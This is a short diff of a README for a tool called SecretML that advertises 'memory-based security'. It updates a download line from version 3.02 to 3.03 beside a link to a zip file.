@@ -17,7 +17,7 @@ This means your security lives only in your head — not on paper, not on device
 ---
 ✅ Try the new **SecretML-Seed** and experience memory-based security!
 
-✅ Download SecretML v3.02  
+✅ Download SecretML v3.03  
 
 [SecretML v3.03.zip](https://github.com/user-attachments/files/22231645/SecretML.v3.03.zip)
 
